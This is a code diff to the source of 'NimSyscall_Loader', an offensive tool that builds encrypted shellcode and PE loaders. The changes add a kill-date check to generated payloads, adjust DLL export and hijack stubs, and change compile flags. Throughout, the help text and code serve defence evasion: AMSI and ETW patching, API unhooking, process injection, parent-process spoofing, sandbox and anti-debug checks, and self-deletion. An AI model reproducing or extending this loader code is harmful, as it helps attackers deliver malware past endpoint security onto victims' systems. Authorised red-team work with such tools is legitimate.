@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --killdate=<yyyymmdd> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -86,6 +86,7 @@ Options:
   --environmentalKey value    Use environmental key (domain,username) to encrypt with
                               domain -> enumerate the current domain on runtime and use that as key
                               username -> enumerate the current username on runtime and use that as key
+  --killdate yyyymmdd    Specify an date, after which the payload won't get executed anymore
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
@@ -285,6 +286,7 @@ var
     dnsdomain: string = ""
     customKey: bool = false
     environmentalKey: bool = false
+    killdate: string = ""
     environmentalDomain: bool = false
     environmentalUsername: bool = false
     environmentalcheckfmt: string = ""
@@ -405,6 +407,10 @@ if args["--environmentalKey"]:
       environmentalDomain = true
     if(m.contains("username")):
       environmentalUsername = true
+
+if args["--killdate"]:
+  let killdatestring = args["--killdate"]
+  killdate = fmt"{killdatestring}"
 
 if args["--key"]:
   let keyname = args["--key"]
@@ -908,6 +914,17 @@ if (useQueueAPC and remoteinject and syswhispers):
 #if (remoteMapSection and dripallocate):
 #    echo "Error: Cannot use both --mapSection and --dripallocate, not implemented yet"
 #    quit(1)
+
+# cannot use mapsection and stomb in parallel
+if(remoteMapSection and stomb):
+    echo "Error: Cannot use both --mapSection and --stomb, either use one or the other"
+    quit(1)
+
+# if csout, psout and output file are defined, state outputfile cannot be used
+if args["--output"]:
+    if (csout and psout):
+        echo "Error: Cannot use --output with --csout and --psout at the same time. Stick with the default output name."
+        quit(1)
 
 if (peload and dripallocate):
     echo "Error: Cannot use both --peload and --dripallocate, not implemented yet"
@@ -2331,6 +2348,27 @@ when defined(logFile):
 
 """
 
+
+let killdateStub = """
+
+
+proc checkDate() =
+  var killdate = obf("KILLDATEREPLACE")  # yyyymmdd format
+  var now: SYSTEMTIME
+  GetLocalTime(addr now)
+  var date = fmt"{now.wYear}{now.wMonth:02}{now.wDay:02}"  # yyyymmdd format
+  echo date
+  echo killdate
+  if date >= killdate:
+    # MessageBoxA(0, cast[LPCSTR](cstring("This program has expired!")), cast[LPCSTR](cstring("Error")), MB_OK)
+    quit(1)
+  # else:
+    # MessageBoxA(0, cast[LPCSTR](cstring("This program is still valid!")), cast[LPCSTR](cstring("Success")), MB_OK)
+
+checkDate()
+
+"""
+
 let macPayloadStub = fmt"""
 
 
@@ -2691,8 +2729,8 @@ proc officeFileCheck(): void =
     var fileCount: int = 0
     var AppXManifest: string = obf(r"C:\Program Files\Microsoft Office\AppXManifest.xml")
     var dwAttributes: DWORD
-    let wideAppXManifest = newWideCString(AppXManifest)
-    dwAttributes = GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideAppXManifest))
+    var wideAppXManifest: WideCString = newWideCString(AppXManifest)
+    dwAttributes = GetFileAttributesW(cast[LPCWSTR](wideAppXManifest))
     if (dwAttributes != INVALID_FILE_ATTRIBUTES):
         fileCount += 1
         when defined(verbose):
@@ -2703,8 +2741,8 @@ proc officeFileCheck(): void =
     else:
         # check if file "C:\Program Files\Microsoft Office\RappelZapp.xml" exists
         var RappelZapp: string = obf(r"C:\Program Files\Microsoft Office\RappelZapp.xml")
-        let wideRappelZapp = newWideCString(RappelZapp)
-        dwAttributes = GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideRappelZapp))
+        var wideRappelZapp: WideCString = newWideCString(RappelZapp)
+        dwAttributes = GetFileAttributesW(cast[LPCWSTR](wideRappelZapp))
         if dwAttributes != INVALID_FILE_ATTRIBUTES:
             fileCount += 1
             when defined(verbose):
@@ -2716,9 +2754,9 @@ proc officeFileCheck(): void =
     # Now check if C:\\PROGRA~1\\WindowsApps and C:\\PROGRA~2\\WindowsApps exist
     var WindowsApps: string = obf(r"C:\PROGRA~1\WindowsApps")
     var WindowsApps2: string = obf(r"C:\PROGRA~2\WindowsApps")
-    let wideWindowsApps = newWideCString(WindowsApps)
-    let wideWindowsApps2 = newWideCString(WindowsApps2)
-    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideWindowsApps2))):
+    var wideWindowsApps: WideCString = newWideCString(WindowsApps)
+    var wideWindowsApps2: WideCString = newWideCString(WindowsApps2)
+    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](wideWindowsApps2))):
         fileCount += 1
         when defined(verbose):
             echo obf("[*] File: ") & WindowsApps & obf(" or ") & WindowsApps2 & obf(" exists")
@@ -2977,18 +3015,19 @@ let DllStub = """
 import dynlib
 proc NimMain() {.cdecl, importc.}
 
-when defined(notcloned) :
-    proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-        NimMain()
-        return true
+when not defined(dllexportfuncs):
+    when defined(notcloned) :
+        proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+            NimMain()
+            return true
 
-    proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-        NimMain()
-        return true
+        proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+            NimMain()
+            return true
 
-    proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-        NimMain()
-        return true
+        proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+            NimMain()
+            return true
 """
 
 let PerfectDLLHijackStub = """
@@ -3025,8 +3064,9 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
 let DLLHijackStub = """
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-  when not defined(payloadFunc):
-    NimMain()
+  when not defined(dllexportfuncs):
+    when not defined(payloadFunc):
+      NimMain()
   
   if fdwReason == DLL_PROCESS_ATTACH:
     NimMain()
@@ -3934,6 +3974,11 @@ if(pump):
             echo "[*] Adding reputation"
             stub.add(genTrustedwords(rand(3500..6200)))
 
+if(killdate != ""):
+    var killdateStubnew = killdateStub.replace("KILLDATEREPLACE", killdate)
+    stub.add(killdateStubnew)
+
+
 if(antidebug):
     stub.add(AntiDebugPEBStub)
     stub.add(IsDebuggerPresentStub)
@@ -4471,15 +4516,19 @@ elif system.hostOS == "windows":
     if (denim):
         basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
     else:
-        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes -d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
-    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes -d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg " # -d:noRes is used to not embed a winim manifest in the loader
 
 if((existingprocessInjection == false) and (remoteinject) and (not conhostinject)):
     basicCompileFlags.add("-d:spawninject ")
 
 if(conhostinject):
     basicCompileFlags.add("-d:conhostinject ")
+
+# if dllexportfunctions sequence is not empty, add -d:dllexportfuncs
+if args["--dllexportfunc"]:
+    basicCompileFlags.add("-d:dllexportfuncs ")
 
 if(mutexoneshot):
     basicCompileFlags.add("-d:mutexoneshot ")
@@ -4579,7 +4628,7 @@ if (dllProxy):
 
 # if payloadFunction is not empty, add -d:payloadFunc
 if (payloadFunction != ""):
-    basicCompileFlags.add(fmt"-d:payloadFunc -d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg ")
+    basicCompileFlags.add(fmt"-d:payloadFunc ")
 
 if(service):
     basicCompileFlags.add("-d:service ")
@@ -4596,6 +4645,9 @@ if(usepoolparty):
 
 if (threadlessthread):
     basicCompileFlags.add("-d:threadlessthread ")
+
+# add --passc=-static 
+basicCompileFlags.add("--passc=-static --passl=-static ")
 
 if(dllProxy):
     when system.hostOS == "windows":
@@ -4726,6 +4778,7 @@ else:
         basicCompileFlags.add("--app=console ")
     if (reflective):
         basicCompileFlags.add("--passL:-Wl,--dynamicbase,--export-all-symbols ")
+
 
 if((syswhispers != true) and (hellsgate != true)):
     if system.hostOS == "windows":
